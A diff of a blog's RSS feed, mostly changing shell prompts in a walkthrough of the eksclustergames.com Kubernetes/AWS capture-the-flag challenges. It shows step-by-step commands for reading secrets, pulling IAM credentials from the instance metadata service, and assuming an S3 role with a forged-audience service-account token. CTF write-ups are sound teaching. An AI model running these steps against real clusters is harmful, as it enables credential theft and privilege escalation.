@@ -9,9 +9,9 @@
             <link>https://sontek.net</link>
         </image>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Fri, 03 Nov 2023 04:34:02 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 03 Nov 2023 13:45:01 GMT</lastBuildDate>
         <atom:link href="https://sontek.net/rss.xml" rel="self" type="application/rss+xml"/>
-        <pubDate>Fri, 03 Nov 2023 04:34:01 GMT</pubDate>
+        <pubDate>Fri, 03 Nov 2023 13:45:00 GMT</pubDate>
         <copyright><![CDATA[All rights reserved 2023, @sontek]]></copyright>
         <item>
             <title><![CDATA[eksclustergames.com walk through!]]></title>
@@ -23,12 +23,12 @@ kubernetes vulnerabilities. This is a walk through on how to solve the issues.</
 Can you spot the flag among them?
 </code></pre>
 <p>So lets start off by getting the secrets:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret </span>
+<pre><code class="hljs language-bash">❯ kubectl get secret
 NAME         TYPE     DATA   AGE
 log-rotate   Opaque   1      37h
 </code></pre>
 <p>Since there is only one, lets view it!</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret -o json</span>
+<pre><code class="hljs language-bash">❯ kubectl get secret -o json
 {
     <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
     <span class="hljs-string">"items"</span>: [
@@ -56,7 +56,7 @@ log-rotate   Opaque   1      37h
 </code></pre>
 <p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can
 decode it as well:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d</span>
+<pre><code class="hljs language-bash">❯ kubectl get secret -o json|jq <span class="hljs-string">'.items[0].data.flag'</span> -r | <span class="hljs-built_in">base64</span> -d
 wiz_eks_challenge{omg_over_privileged_*REDACTED*}
 </code></pre>
 <p>First flag found!</p>
@@ -71,18 +71,18 @@ For your convenience, the crane utility <span class="hljs-keyword">is</span> alr
 <p>The first thing I think of when reading this is that it has something to do
 with the registry a pod is living on.   So lets list the pods and see what is
 available:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod
 NAME                    READY   STATUS    RESTARTS   AGE
 database-pod-2c9b3a4e   1/1     Running   0          36h
 </code></pre>
 <p>With only one pod as a target, lets get the image for it:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.containers[0].image'</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod -o json |jq <span class="hljs-string">'.items[0].spec.containers[0].image'</span>
 <span class="hljs-string">"eksclustergames/base_ext_image"</span>
 </code></pre>
 <p>So its on standard <code>docker.io</code> registry instead of a private one like I was
 expecting from the clue.   The second hint was that crane is on the system so
 lets use that to pull the image and inspect it:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config eksclustergames/base_ext_image          </span>
+<pre><code class="hljs language-bash">❯ crane config eksclustergames/base_ext_image 
 Error: fetching config: reading image <span class="hljs-string">"eksclustergames/base_ext_image"</span>: GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]
 </code></pre>
 <p>Which means this is a private image and we are going to need to get some
@@ -90,7 +90,7 @@ credentials to an account that has access to this image. Usually you have to
 define a secret for kubernetes to be able to pull from private registries and
 since we started off with a secret test first that is where I'm going to go
 next:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod -o json |jq <span class="hljs-string">'.items[0].spec.imagePullSecrets'</span>
 [
   {
     <span class="hljs-string">"name"</span>: <span class="hljs-string">"registry-pull-secrets-780bab1d"</span>
@@ -98,7 +98,7 @@ next:</p>
 ]
 </code></pre>
 <p>So that is the secret we need, lets view it:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq</span>
+<pre><code class="hljs language-bash">❯ kubectl get secret registry-pull-secrets-780bab1d -o json |jq <span class="hljs-string">'.data.".dockerconfigjson"'</span> -r|<span class="hljs-built_in">base64</span> -d|jq
 {
   <span class="hljs-string">"auths"</span>: {
     <span class="hljs-string">"index.docker.io/v1/"</span>: {
@@ -108,15 +108,15 @@ next:</p>
 }
 </code></pre>
 <p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># echo "ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d</span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">echo</span> <span class="hljs-string">"ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw=="</span> | <span class="hljs-built_in">base64</span> -d
 eksclustergames:dckr&#x3C;*REDACTED*>
 </code></pre>
 <p>So now we can login with <code>crane auth</code>:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane auth login -u eksclustergames -p dckr&#x3C;*REDACTED*> docker.io</span>
+<pre><code class="hljs language-bash">❯ crane auth login -u eksclustergames -p dckr&#x3C;*REDACTED*> docker.io
 2023/11/03 02:35:49 logged <span class="hljs-keyword">in</span> via /home/user/.docker/config.json
 </code></pre>
 <p>So if we try to view the image again it should work!</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config eksclustergames/base_ext_image|jq</span>
+<pre><code class="hljs language-bash">❯ crane config eksclustergames/base_ext_image|jq
 {
   <span class="hljs-string">"architecture"</span>: <span class="hljs-string">"amd64"</span>,
   <span class="hljs-string">"config"</span>: {
@@ -178,32 +178,32 @@ inspect the image layers, <span class="hljs-built_in">and</span> uncover the hid
 that we are in the pod itself it makes me believe we'll have something like IRSA
 access to AWS from the pod and need to use that to get to it.</p>
 <p>First lets check what pods we are working with:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod
 NAME                      READY   STATUS    RESTARTS   AGE
 accounting-pod-876647f8   1/1     Running   0          37h
 </code></pre>
 <p>So same as the last challenge, lets get the image and see what access we have:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.containers[0].image'</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod -o json |jq <span class="hljs-string">'.items[0].spec.containers[0].image'</span>
 <span class="hljs-string">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span>
 </code></pre>
 <p>Which as expected, we do not have access to:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span>
+<pre><code class="hljs language-bash">❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
 Error: fetching config: reading image <span class="hljs-string">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span>: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized
 </code></pre>
 <p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>
+<pre><code class="hljs language-bash">❯ aws sts get-caller-identity
 
 Unable to locate credentials. You can configure credentials by running <span class="hljs-string">"aws configure"</span>.
 </code></pre>
 <p>Credentials are not configured right now, so we need to discover them.  Lets
 check if we have metadata server access:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl http://169.254.169.254/latest/meta-data/iam</span>
+<pre><code class="hljs language-bash">❯ curl http://169.254.169.254/latest/meta-data/iam
 info
 security-credentials/
 </code></pre>
 <p>We do!  So we should be able to pull the credentials out of there to get access
 to AWS:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq</span>
+<pre><code class="hljs language-bash">❯ curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq
 {
   <span class="hljs-string">"AccessKeyId"</span>: <span class="hljs-string">"ASIA2AVYNE&#x3C;*REDACTED*>"</span>,
   <span class="hljs-string">"Expiration"</span>: <span class="hljs-string">"2023-11-03 03:50:19+00:00"</span>,
@@ -216,7 +216,7 @@ to AWS:</p>
 <span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="hljs-string">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span>
 <span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=<span class="hljs-string">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span>
 
-root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>
+❯ aws sts get-caller-identity
 {
     <span class="hljs-string">"UserId"</span>: <span class="hljs-string">"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282"</span>,
     <span class="hljs-string">"Account"</span>: <span class="hljs-string">"688655246681"</span>,
@@ -224,12 +224,12 @@ root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity
 }
 </code></pre>
 <p>Now we should be able to authenticate crane and inspect the image from ECR:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export PASSWORD=$(aws ecr get-login-password)</span>
-root@wiz-eks-challenge:~<span class="hljs-comment"># crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  </span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">export</span> PASSWORD=$(aws ecr get-login-password)
+❯ crane auth login -u AWS -p <span class="hljs-variable">$PASSWORD</span> 688655246681.dkr.ecr.us-west-1.amazonaws.com  
 2023/11/03 02:56:41 logged <span class="hljs-keyword">in</span> via /home/user/.docker/config.json
 </code></pre>
 <p>Lets get those layers!</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq</span>
+<pre><code class="hljs language-bash">❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq
 {
   <span class="hljs-string">"architecture"</span>: <span class="hljs-string">"amd64"</span>,
   <span class="hljs-string">"config"</span>: {
@@ -290,11 +290,11 @@ service-account?
 <p>This sounds like we're going to need to escalate our privileges through the AWS
 access we acquired in the last challenge. Lets start with inspecting the
 environment again:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
+<pre><code class="hljs language-bash">❯ kubectl get pod
 Error from server (Forbidden): pods is forbidden: User <span class="hljs-string">"system:serviceaccount:challenge4:service-account-challenge4"</span> cannot list resource <span class="hljs-string">"pods"</span> <span class="hljs-keyword">in</span> API group <span class="hljs-string">""</span> <span class="hljs-keyword">in</span> the namespace <span class="hljs-string">"challenge4"</span>
 </code></pre>
 <p>So we don't even have access to list pods!   Do we have any access?</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl auth can-i --list</span>
+<pre><code class="hljs language-bash">❯ kubectl auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs                     Resource Names     Verbs
 selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
@@ -323,7 +323,7 @@ podsecuritypolicies.policy                      []                              
 the escalated privileges.  Usually we could use <code>aws eks get-token</code> but that
 requires knowing the cluster name and I don't know that.   Lets try to list the
 clusters:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws eks list-clusters</span>
+<pre><code class="hljs language-bash">❯ aws eks list-clusters
 
 An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
 </code></pre>
@@ -333,12 +333,12 @@ a clue but that is relying on them being consistent with their naming:</p>
 </code></pre>
 <p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't
 guarantee that. Lets check its security groups:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo</span>
+<pre><code class="hljs language-bash">❯ curl -sS http://169.254.169.254/latest/meta-data/security-groups;<span class="hljs-built_in">echo</span>
 eks-cluster-sg-eks-challenge-cluster-963543728
 </code></pre>
 <p>The name is there again.  I don't feel good about not having more details but it
 is at least worth trying it:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws eks get-token --cluster-name eks-challenge-cluster</span>
+<pre><code class="hljs language-bash">❯ aws eks get-token --cluster-name eks-challenge-cluster
 {
     <span class="hljs-string">"kind"</span>: <span class="hljs-string">"ExecCredential"</span>,
     <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"client.authentication.k8s.io/v1beta1"</span>,
@@ -350,8 +350,8 @@ is at least worth trying it:</p>
 }
 </code></pre>
 <p>This gets us a token, so lets try to use it:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)</span>
-root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" auth can-i --list</span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">export</span> TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq <span class="hljs-string">'.status.token'</span> -r)
+❯ kubectl --token <span class="hljs-string">"<span class="hljs-variable">$TOKEN</span>"</span> auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs   Resource Names     Verbs
 serviceaccounts/token                           []                  [debug-sa]         [create]
@@ -379,7 +379,7 @@ serviceaccounts                                 []                  []          
 podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
 </code></pre>
 <p>Perfect!  We have more access which includes fetching secrets:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" get secret -o json</span>
+<pre><code class="hljs language-bash">❯ kubectl --token <span class="hljs-string">"<span class="hljs-variable">$TOKEN</span>"</span> get secret -o json
 {
     <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
     <span class="hljs-string">"items"</span>: [
@@ -406,7 +406,7 @@ podsecuritypolicies.policy                      []                  [eks.privile
 }
 </code></pre>
 <p>So we just need to base64 decode that and we are on to the next challenge!</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" get secret -o json | jq '.items[0].data.flag' -r|base64 -d</span>
+<pre><code class="hljs language-bash">❯ kubectl --token <span class="hljs-string">"<span class="hljs-variable">$TOKEN</span>"</span> get secret -o json | jq <span class="hljs-string">'.items[0].data.flag'</span> -r|<span class="hljs-built_in">base64</span> -d
 wiz_eks_challenge{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}
 </code></pre>
 <h1>Challenge 5</h1>
@@ -418,17 +418,17 @@ AWS account.
 Can you acquire the AWS role <span class="hljs-keyword">of</span> the s3access-sa service account, <span class="hljs-built_in">and</span> <span class="hljs-keyword">get</span> the flag?
 </code></pre>
 <p>So lets start with checking what access we do have:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl whoami </span>
+<pre><code class="hljs language-bash">❯ kubectl <span class="hljs-built_in">whoami</span>
 system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal
 </code></pre>
 <p>Can we list buckets?</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws s3 ls</span>
+<pre><code class="hljs language-bash">❯ aws s3 <span class="hljs-built_in">ls</span>
 
 An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
 </code></pre>
 <p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do
 we have?</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl auth can-i --list</span>
+<pre><code class="hljs language-bash">❯ kubectl auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs   Resource Names     Verbs
 serviceaccounts/token                           []                  [debug-sa]         [create]
@@ -457,8 +457,8 @@ podsecuritypolicies.policy                      []                  [eks.privile
 </code></pre>
 <p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems
 suspicious. So lets see if that will get us anywhere:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export TOKEN=$(kubectl create token debug-sa)</span>
-root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token $TOKEN auth can-i --list</span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">export</span> TOKEN=$(kubectl create token debug-sa)
+❯ kubectl --token <span class="hljs-variable">$TOKEN</span> auth can-i --list
 warning: the list may be incomplete: webhook authorizer does not support user rule resolution
 Resources                                       Non-Resource URLs                     Resource Names     Verbs
 selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
@@ -485,7 +485,7 @@ podsecuritypolicies.policy                      []                              
 </code></pre>
 <p>Looks like we have less access than before.  So not too helpful, lets take a
 look at that service account we want to become:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get sa s3access-sa -o json</span>
+<pre><code class="hljs language-bash">❯ kubectl get sa s3access-sa -o json
 {
     <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
     <span class="hljs-string">"kind"</span>: <span class="hljs-string">"ServiceAccount"</span>,
@@ -503,21 +503,21 @@ look at that service account we want to become:</p>
 </code></pre>
 <p>I think we are going to need to use our AWS access to assume that role, I don't
 believe our kubernetes access is going to get us anywhere:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test</span>
+<pre><code class="hljs language-bash">❯ aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class="hljs-built_in">test</span>
 
 An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
 </code></pre>
 <p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role
 directly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN</span>
+<pre><code class="hljs language-bash">❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class="hljs-built_in">test</span> --web-identity-token <span class="hljs-variable">$TOKEN</span>
 
 An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
 </code></pre>
 <p>Getting closer!   The default audience for a token created with <code>kubectl</code> is
 <code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try
 creating it again with <code>sts.amazonaws.com</code>:</p>
-<pre><code class="hljs language-bash"><span class="hljs-built_in">export</span> TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
-root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN</span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">export</span> TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
+❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class="hljs-built_in">test</span> --web-identity-token <span class="hljs-variable">$TOKEN</span>
 {
     <span class="hljs-string">"Credentials"</span>: {
         <span class="hljs-string">"AccessKeyId"</span>: <span class="hljs-string">"ASIA2AVYNEV&#x3C;*REDACTED*>"</span>,
@@ -535,11 +535,11 @@ root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role-with-we
 }
 </code></pre>
 <p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>
-<pre><code class="hljs language-bash"><span class="hljs-built_in">export</span> AWS_ACCESS_KEY_ID=<span class="hljs-string">"ASIA2AVYNEV&#x3C;*REDACTED*>"</span>
-<span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="hljs-string">"VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span>
-<span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=<span class="hljs-string">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span>
+<pre><code class="hljs language-bash">❯ <span class="hljs-built_in">export</span> AWS_ACCESS_KEY_ID=<span class="hljs-string">"ASIA2AVYNEV&#x3C;*REDACTED*>"</span>
+❯ <span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="hljs-string">"VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span>
+❯ <span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=<span class="hljs-string">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span>
 
-root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>
+❯ aws sts get-caller-identity
 {
     <span class="hljs-string">"UserId"</span>: <span class="hljs-string">"AROA2AVYNEVMZEZ2AFVYI:test"</span>,
     <span class="hljs-string">"Account"</span>: <span class="hljs-string">"688655246681"</span>,
@@ -569,9 +569,9 @@ providing us the IAM policy:</p>
 <span class="hljs-punctuation">}</span>
 </code></pre>
 <p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>
-<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .</span>
+<pre><code class="hljs language-bash">❯ aws s3 <span class="hljs-built_in">cp</span> s3://challenge-flag-bucket-3ff1ae2/flag .
 download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       
-croot@wiz-eks-challenge:~<span class="hljs-comment"># cat flag</span>
+❯ <span class="hljs-built_in">cat</span> flag
 wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}
 </code></pre>
 <p>and thats the final flag! In my next post I'll discuss the remediation steps
@@ -983,7 +983,7 @@ job there is no reason to worry about rotating secrets.</li>
 </ul>
 <p>The following diagram gives an overview of how we can use Terraform Cloud's
 OIDC provider to integrate with AWS:</p>
-<div class="remark-mermaid remark-mermaid-default"><svg aria-roledescription="flowchart-v2" role="graphics-document document" viewBox="-8 -8 843.078125 320" style="max-width: 843.078px; background-color: transparent;" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" width="100%" id="mermaid-1698986042405"><style>#mermaid-1698986042405{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}#mermaid-1698986042405 .error-icon{fill:#552222;}#mermaid-1698986042405 .error-text{fill:#552222;stroke:#552222;}#mermaid-1698986042405 .edge-thickness-normal{stroke-width:2px;}#mermaid-1698986042405 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1698986042405 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1698986042405 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1698986042405 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1698986042405 .marker{fill:#333333;stroke:#333333;}#mermaid-1698986042405 .marker.cross{stroke:#333333;}#mermaid-1698986042405 svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-1698986042405 .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-1698986042405 .cluster-label text{fill:#333;}#mermaid-1698986042405 .cluster-label span{color:#333;}#mermaid-1698986042405 .label text,#mermaid-1698986042405 span{fill:#333;color:#333;}#mermaid-1698986042405 .node rect,#mermaid-1698986042405 .node circle,#mermaid-1698986042405 .node ellipse,#mermaid-1698986042405 .node polygon,#mermaid-1698986042405 .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-1698986042405 .node .label{text-align:center;}#mermaid-1698986042405 .node.clickable{cursor:pointer;}#mermaid-1698986042405 .arrowheadPath{fill:#333333;}#mermaid-1698986042405 .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-1698986042405 .flowchart-link{stroke:#333333;fill:none;}#mermaid-1698986042405 .edgeLabel{background-color:#e8e8e8;text-align:center;}#mermaid-1698986042405 .edgeLabel rect{opacity:0.5;background-color:#e8e8e8;fill:#e8e8e8;}#mermaid-1698986042405 .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-1698986042405 .cluster text{fill:#333;}#mermaid-1698986042405 .cluster span{color:#333;}#mermaid-1698986042405 div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-1698986042405 .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-1698986042405 :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="10" viewBox="0 0 12 20" class="marker flowchart" id="flowchart-pointEnd"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 0 L 10 5 L 0 10 z"></path></marker><marker orient="auto" markerHeight="12" markerWidth="12" markerUnits="userSpaceOnUse" refY="5" refX="0" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-pointStart"><path style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 0 5 L 10 10 L 10 0 z"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="11" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-circleEnd"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5" refX="-1" viewBox="0 0 10 10" class="marker flowchart" id="flowchart-circleStart"><circle style="stroke-width: 1; stroke-dasharray: 1, 0;" class="arrowMarkerPath" r="5" cy="5" cx="5"></circle></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="12" viewBox="0 0 11 11" class="marker cross flowchart" id="flowchart-crossEnd"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><marker orient="auto" markerHeight="11" markerWidth="11" markerUnits="userSpaceOnUse" refY="5.2" refX="-1" viewBox="0 0 11 11" class="marker cross flowchart" id="flowchart-crossStart"><path style="stroke-width: 2; stroke-dasharray: 1, 0;" class="arrowMarkerPath" d="M 1,1 l 9,9 M 10,1 l -9,9"></path></marker><g class="root"><g class="clusters"></g><g class="edgePaths"><path marker-end="url(#flowchart-pointEnd)" style="fill:none;" class="edge-thickness-normal edge-pattern-solid flowchart-link LS-AWS LE-Token" id="L-AWS-Token-0" d="M185.671875,134.5L181.50520833333334,134.5C177.33854166666666,134.5,169.00520833333334,134.5,152.378260969764,145.875C135.75131360619469,157.25,110.83075221238937,180,98.37047151548673,191.375L85.91019081858407,202.75"></path><path 